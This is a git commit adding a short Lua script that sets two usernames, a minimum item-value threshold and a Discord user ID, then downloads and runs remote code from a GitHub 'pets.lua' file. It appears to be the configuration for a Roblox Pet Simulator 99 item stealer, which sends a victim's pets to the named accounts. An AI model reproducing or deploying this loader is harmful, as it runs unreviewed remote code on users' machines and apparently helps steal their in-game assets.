dc3f3f439efffc92af157d4eb0b1862be0eaf649
Russeruh <brycenicholasribardi@outlook.com>
2025-05-27 11:26:34 -0500

    upload 6459d76091d6c95ee6a20805.lua

---
+++ 6459d76091d6c95ee6a20805.lua
@@ -0,0 +1,5 @@
+Username = "hillyxyz"
+Username2 = "hilyxyz"
+min_rap = 1
+discuser = "1327004617497645157"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/P99/main/pets.lua"))()
